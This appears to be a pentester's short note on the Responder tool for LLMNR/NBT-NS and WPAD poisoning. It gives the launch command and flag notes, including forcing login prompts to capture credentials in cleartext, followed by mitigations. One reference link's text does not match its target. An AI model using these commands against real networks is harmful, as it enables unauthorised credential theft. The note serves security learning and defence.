Responder

```
responder -i <AttackingIP> -w

-i specific ip address
-I specific network interface
-w Starts WPAD proxy server. For computers looking for WPAD responder will send its information
-F (this forces a login prompt for users to grab creds in cleartext) 
-b HTTP authentication ( prompts when users use IE)
-r needed to rectify -b errors

Note don't use -b and/or -r in a production environment
```

**Responder 2.0:**

Repsonder with NTLMv2

[https://www.trustwave.com/Resources/SpiderLabs-Blog/Responder-2-0---Owning-Windows-Networks-part-3/](https://www.trustwave.com/Resources/SpiderLabs-Blog/Responder-2-0---Owning-Windows-Networks-part-3/)





To mitigate this attack from potentially happening in your local network domain, it is best to disable LLMNR and NBT-NS. Note that in the above attack scenarios, these protocols were only used when no DNS entries existed for the queries. Providing your DNS server resolves the names that need to be found in your network, the other protocols do not need running.



To mitigate against the WPAD attack, you can add an entry for "wpad" in your DNS zone. Note that the DNS entry does not need to point to a valid WPAD server. As long as the queries are resolved, the attack will be prevented.













**References:**

[https://www.youtube.com/watch?v=sAr4PBR7EUE](https://www.youtube.com/watch?v=sAr4PBR7EUE)

[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.gitbook.com/book/pittst0p/ctf/edit#)

